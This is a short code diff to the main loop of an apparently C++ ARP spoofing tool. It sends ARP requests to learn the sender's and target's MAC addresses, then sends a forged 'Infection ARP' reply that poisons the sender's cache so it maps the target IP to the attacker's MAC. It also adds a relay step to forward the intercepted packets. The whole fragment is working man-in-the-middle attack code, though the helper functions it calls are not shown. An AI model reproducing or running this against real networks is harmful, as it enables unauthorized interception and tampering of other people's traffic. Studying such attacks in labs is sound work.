@@ -28,16 +28,23 @@ int main(int argc, char* argv[]) {
         spoof.SetSendnTargetIp(argv[i], argv[i+1]);
         
         EthArpPacket packet;
-        spoof.SetArpPacketDefault(packet);
+        spoof.SetDefaultArpPacket(packet);
 
-        //Broadcast
+        //sender 
 		spoof.SetPacket(packet, Mac("FF:FF:FF:FF:FF:FF"), attackerMac, ArpHdr::Request, attackerIP, Mac("00:00:00:00:00:00"), spoof.senderIP_);
 		spoof.SendPacket(pcap, packet);
+        spoof.GetSrcMac(pcap, "Sender");
+
+        //target
+		spoof.SetPacket(packet, Mac("FF:FF:FF:FF:FF:FF"), attackerMac, ArpHdr::Request, attackerIP, Mac("00:00:00:00:00:00"), spoof.targetIP_);
+		spoof.SendPacket(pcap, packet);
+        spoof.GetSrcMac(pcap, "Target");
 
         //Infection ARP
-        spoof.GetSenderMac(pcap);
         spoof.SetPacket(packet, spoof.senderMac_, attackerMac, ArpHdr::Reply, spoof.targetIP_, spoof.senderMac_, spoof.senderIP_);
 		spoof.SendPacket(pcap, packet);
+
+        spoof.RelayPacket(pcap, attackerMac);
 
     }
 
